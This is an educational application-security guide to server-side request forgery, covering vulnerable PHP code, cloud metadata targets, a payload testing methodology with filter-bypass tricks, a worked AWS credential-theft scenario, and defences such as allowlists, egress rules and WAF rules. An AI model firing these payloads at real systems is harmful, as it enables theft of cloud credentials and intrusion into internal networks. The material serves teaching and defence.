# Server-Side Request Forgery (SSRF)

**Exploiting server trust relationships to access internal resources**

- **OWASP Top 10 2021:** A10 – Server-Side Request Forgery
- **CWE:** 918 – Server-Side Request Forgery

---

## What is SSRF?

Server-Side Request Forgery occurs when an application makes HTTP requests to attacker-controlled destinations without proper validation. The server becomes a proxy for attackers to access resources that should be unreachable from the internet.

**The core problem:** Applications trust their own network position more than external users trust it. When attackers can manipulate where the server makes requests, they inherit that elevated trust.

---

## Why SSRF Matters in AppSec

SSRF is a **trust boundary violation**. The application crosses from untrusted user input to trusted internal network context without proper authorization checks.

**Common business impact:**
- **Cloud credential theft** — AWS metadata at `169.254.169.254` exposes IAM credentials
- **Internal service access** — Reach admin panels, databases, message queues on `localhost`
- **Data exfiltration** — Extract sensitive data from internal APIs
- **Lateral movement** — Use compromised server as pivot point into internal network
- **Complete cloud account takeover** — Stolen IAM credentials grant full AWS/GCP/Azure access

**Severity:** Typically rated **High to Critical** (CVSS 7.5-9.1) depending on accessible internal resources.

---

## How SSRF Happens

### Vulnerable Application Patterns

SSRF vulnerabilities commonly arise in features that:

| Feature Type | Example Use Case | Why It's Vulnerable |
|--------------|-----------------|---------------------|
| **URL Fetchers** | "Import from URL", "Load image from URL" | User controls destination URL |
| **Webhooks** | Payment notifications, CI/CD triggers | Attacker registers internal URL as webhook |
| **PDF Generators** | "Convert webpage to PDF" | Server fetches attacker-controlled URL |
| **Link Previews** | Social media URL unfurling | Server fetches URL to extract metadata |
| **API Integrations** | Third-party service connectors | Redirects or DNS rebinding bypass allowlists |
| **File Uploads** | SVG with external references | XML external entities trigger requests |

### Vulnerable Code Example (PHP)
```php
// Vulnerable: User input directly used in server-side request
$url = $_GET['url'];
$content = file_get_contents($url);
echo $content;
```

**Why this is exploitable:**
- No validation on `$url` parameter
- Attacker can set `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- Server fetches AWS credentials and returns them to attacker

---

## Common SSRF Targets

### Internal Services
```
http://localhost/admin
http://127.0.0.1:8080
http://0.0.0.0:6379        # Redis
http://[::1]:3306          # MySQL (IPv6 localhost)
```

### Private IP Ranges (RFC 1918)
```
http://10.0.0.1            # Class A private
http://172.16.0.1          # Class B private
http://192.168.1.1         # Class C private
```

### Cloud Metadata Services

| Provider | Metadata Endpoint | What It Exposes |
|----------|------------------|-----------------|
| **AWS** | `http://169.254.169.254/latest/meta-data/` | IAM credentials, instance metadata |
| **GCP** | `http://metadata.google.internal/computeMetadata/v1/` | Service account tokens |
| **Azure** | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Managed identity tokens |
| **DigitalOcean** | `http://169.254.169.254/metadata/v1/` | Droplet metadata |

### Critical AWS Metadata Paths
```bash
# Get IAM role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get temporary AWS credentials (CRITICAL)
http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]

# Get instance user data (may contain secrets)
http://169.254.169.254/latest/user-data/
```

**Impact:** These credentials grant full AWS API access with the instance's IAM role permissions.

---

## Testing Methodology

### Step 1: Identify Server-Side Request Features

**Look for parameters that trigger server-side requests:**
- `url=`, `path=`, `dest=`, `redirect=`, `feed=`, `image=`
- Webhook registration endpoints
- "Import from URL" functionality
- Link preview/unfurling features
- PDF generation from HTML

**Example vulnerable parameter:**
```
https://app.example.com/preview?url=https://attacker.com/image.png
```

### Step 2: Test for Basic SSRF

**Payload progression:**
```bash
# Test 1: Localhost access
url=http://localhost

# Test 2: Localhost alternate forms
url=http://127.0.0.1
url=http://0.0.0.0
url=http://[::1]
url=http://127.1

# Test 3: AWS metadata (if cloud-hosted)
url=http://169.254.169.254/latest/meta-data/

# Test 4: Internal IP ranges
url=http://10.0.0.1
url=http://192.168.1.1
```

### Step 3: Bypass Techniques

**If basic payloads are blocked, try:**

#### URL Encoding
```
url=http%3A%2F%2F127.0.0.1
```

#### Decimal/Octal/Hex IP Representation
```
url=http://2130706433        # 127.0.0.1 in decimal
url=http://0x7f000001        # 127.0.0.1 in hex
url=http://017700000001      # 127.0.0.1 in octal
```

#### DNS Rebinding
```
# Register domain that alternates between:
# - External IP (passes allowlist check)
# - Internal IP (actual request destination)
url=http://rebind.attacker.com
```

#### Open Redirects
```
# If target.com has open redirect:
url=https://target.com/redirect?url=http://169.254.169.254
```

#### Protocol Smuggling
```
url=file:///etc/passwd       # File protocol
url=gopher://localhost:6379  # Gopher protocol for Redis
url=dict://localhost:11211   # Dict protocol for Memcached
```

### Step 4: Detect Blind SSRF

**When responses aren't returned directly:**
```bash
# Use out-of-band detection
url=http://YOUR_BURP_COLLABORATOR.burpcollaborator.net

# Monitor for DNS lookups or HTTP requests to your controlled server
```

**Timing-based detection:**
```bash
# Internal service (fast response)
url=http://localhost  →  200ms response

# Non-existent internal IP (timeout)
url=http://10.255.255.255  →  5000ms timeout
```

---

## Real-World Attack Example

### Scenario: AWS Credential Theft via PDF Generator

**Application:** Invoice generation service with "Import logo from URL" feature

**Attack Flow:**

1. **Identify SSRF:** Logo URL parameter fetches remote images
```
   POST /api/invoice/generate
   {
     "logo_url": "https://company.com/logo.png"
   }
```

2. **Test AWS metadata access:**
```json
   {
     "logo_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
   }
```

3. **Response reveals IAM role name:**
```
   invoice-generator-role
```

4. **Extract full credentials:**
```json
   {
     "logo_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/invoice-generator-role"
   }
```

5. **Server returns:**
```json
   {
     "AccessKeyId": "ASIA...",
     "SecretAccessKey": "...",
     "Token": "...",
     "Expiration": "2024-12-27T12:00:00Z"
   }
```

6. **Impact:** Attacker uses credentials to access S3 buckets, databases, and other AWS resources

**Business Impact:**
- Full AWS account compromise
- Access to all S3 buckets (customer data, backups, logs)
- Violates SOC 2, PCI-DSS, GDPR data protection requirements
- Potential regulatory fines + customer notification requirements

---

## Secure Code Examples

### Vulnerable (Laravel)
```php
// ❌ VULNERABLE: No validation
public function fetchImage(Request $request)
{
    $url = $request->input('url');
    $content = file_get_contents($url);
    return response($content)->header('Content-Type', 'image/png');
}
```

### Secure (Laravel)
```php
// ✅ SECURE: Allowlist + IP validation
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Validator;

public function fetchImage(Request $request)
{
    $url = $request->input('url');
    
    // Validate URL format
    $validator = Validator::make(['url' => $url], [
        'url' => 'required|url|starts_with:https://'
    ]);
    
    if ($validator->fails()) {
        return response()->json(['error' => 'Invalid URL'], 400);
    }
    
    // Parse URL to check host
    $parsed = parse_url($url);
    $host = $parsed['host'];
    
    // Allowlist approach (RECOMMENDED)
    $allowedHosts = ['cdn.example.com', 'images.example.com'];
    if (!in_array($host, $allowedHosts)) {
        return response()->json(['error' => 'Host not allowed'], 403);
    }
    
    // Resolve DNS and check for private IPs
    $ip = gethostbyname($host);
    if ($this->isPrivateIP($ip)) {
        return response()->json(['error' => 'Private IP not allowed'], 403);
    }
    
    // Make request with timeout and no redirects
    try {
        $response = Http::timeout(5)
                       ->withOptions(['allow_redirects' => false])
                       ->get($url);
        
        return response($response->body())
                   ->header('Content-Type', 'image/png');
    } catch (\Exception $e) {
        return response()->json(['error' => 'Fetch failed'], 500);
    }
}

private function isPrivateIP(string $ip): bool
{
    // Check for private IP ranges
    return !filter_var(
        $ip,
        FILTER_VALIDATE_IP,
        FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
    );
}
```

---

## Defense in Depth Strategy

### Application Layer

✅ **1. Allowlist Destinations**
```php
// Only allow specific domains
$allowedDomains = ['cdn.company.com', 'api.partner.com'];
```

✅ **2. Block Private IP Ranges**
```php
// Reject RFC 1918 addresses
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)) {
    // IP is public - allow
}
```

✅ **3. Disable Redirects**
```php
// Prevent redirect-based bypasses
Http::withOptions(['allow_redirects' => false])->get($url);
```

✅ **4. Enforce HTTPS Only**
```php
// Prevent protocol smuggling
if (!str_starts_with($url, 'https://')) {
    throw new InvalidUrlException();
}
```

✅ **5. Validate After DNS Resolution**
```php
// Re-check IP after DNS lookup (prevents DNS rebinding)
$ip = gethostbyname($host);
if ($this->isPrivateIP($ip)) {
    throw new PrivateIPException();
}
```

### Network Layer

✅ **6. Egress Filtering**
```bash
# Firewall rules to block outbound access to private IPs
iptables -A OUTPUT -d 10.0.0.0/8 -j REJECT
iptables -A OUTPUT -d 172.16.0.0/12 -j REJECT
iptables -A OUTPUT -d 192.168.0.0/16 -j REJECT
iptables -A OUTPUT -d 169.254.169.254/32 -j REJECT
```

✅ **7. Disable AWS Metadata IMDSv1**
```bash
# Require IMDSv2 (token-based) to prevent SSRF access
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

### Monitoring & Detection

✅ **8. Log All Outbound Requests**
```php
Log::info('Outbound request', [
    'url' => $url,
    'user_id' => auth()->id(),
    'ip' => request()->ip(),
    'timestamp' => now()
]);
```

✅ **9. Alert on Suspicious Patterns**
```
# Alert on requests to:
- 169.254.169.254 (AWS metadata)
- Private IP ranges from public-facing services
- Unusual protocols (gopher, dict, file)
```

---

## Detection & Monitoring

### Log Analysis

**Indicators of SSRF exploitation:**
```bash
# Outbound requests to AWS metadata
POST /api/preview?url=http://169.254.169.254/latest/meta-data/

# Multiple requests to private IPs
GET /fetch?url=http://10.0.0.1
GET /fetch?url=http://10.0.0.2
GET /fetch?url=http://10.0.0.3

# Unusual protocols in URL parameter
POST /webhook url=gopher://localhost:6379
```

### WAF Rules
```
# Block AWS metadata access
SecRule ARGS "@contains 169.254.169.254" "id:1001,deny,status:403"

# Block private IP patterns
SecRule ARGS "@rx (10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)" "id:1002,deny"

# Block localhost variations
SecRule ARGS "@rx (localhost|127\.0\.0\.1|0\.0\.0\.0)" "id:1003,deny"
```

---

## Compliance & Regulatory Impact

**SSRF violations often trigger:**

- **PCI-DSS Requirement 6.5.10** – Broken authentication and session management
- **GDPR Article 32** – Security of processing (failure to protect personal data)
- **SOC 2** – Access controls and network segmentation
- **HIPAA Security Rule** – Technical safeguards for ePHI

**Financial Impact:**
- **GDPR fines:** Up to €20M or 4% of annual global turnover
- **PCI-DSS:** Loss of payment processing ability
- **SOC 2:** Failed audits, lost enterprise customers

---

## Interview Talking Points

**If asked about SSRF in an interview:**

> "SSRF is fundamentally a trust boundary violation. The application trusts its network position to access internal services, but when attackers control the destination URL, they inherit that trust. I've seen SSRF used to steal AWS credentials from the metadata service at `169.254.169.254`, which grants full cloud account access. The key to prevention is defense in depth: strict allowlists for destinations, blocking private IP ranges at both application and network layers, and disabling automatic redirects. In cloud environments, I also recommend enabling IMDSv2 to require token-based authentication for metadata access."

**Follow-up: "How do you test for SSRF without causing disruption?"**

> "I start with safe targets like my own controlled servers or Burp Collaborator to confirm the application makes outbound requests. Then I test localhost endpoints that shouldn't cause harm—like checking if `http://localhost` returns a different response than `http://10.0.0.1`. For cloud environments, I'll test the metadata endpoint but only read non-sensitive paths like instance ID, never actually extract credentials unless explicitly authorized. The goal is proving the vulnerability exists without actually exfiltrating production data."

**Follow-up: "What's the difference between SSRF and open redirect?"**

> "Open redirect is client-side—the victim's browser gets redirected. SSRF is server-side—the application server makes the request. The impact is different: open redirects are typically used for phishing, while SSRF grants access to internal resources that should be completely unreachable from the internet. That said, open redirects can sometimes be chained with SSRF to bypass destination allowlists—if the server allows `https://trusted-site.com/*` and that site has an open redirect, attackers can use it to reach internal IPs."

---

## Related Vulnerabilities

- **CSRF** (Cross-Site Request Forgery) – Client-side vs. server-side request forgery
- **XXE** (XML External Entity) – Another way to trigger SSRF via XML parsing
- **Open Redirect** – Can be chained with SSRF to bypass allowlists

---

## Additional Resources

- **PortSwigger SSRF Guide:** https://portswigger.net/web-security/ssrf
- **OWASP SSRF Prevention:** https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- **AWS IMDSv2 Guide:** https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- **PayloadsAllTheThings SSRF:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

---

## Quick Reference

### Testing Checklist
- [ ] Identify features that fetch URLs
- [ ] Test localhost/127.0.0.1 access
- [ ] Test private IP ranges
- [ ] Test cloud metadata endpoints
- [ ] Try bypass techniques (encoding, DNS rebinding)
- [ ] Test for blind SSRF (out-of-band detection)

### Remediation Checklist
- [ ] Implement strict allowlist for destinations
- [ ] Block private IP ranges (RFC 1918)
- [ ] Disable automatic redirects
- [ ] Enforce HTTPS-only
- [ ] Validate IP after DNS resolution
- [ ] Add egress firewall rules
- [ ] Enable AWS IMDSv2
- [ ] Log all outbound requests
- [ ] Add WAF rules for metadata endpoints
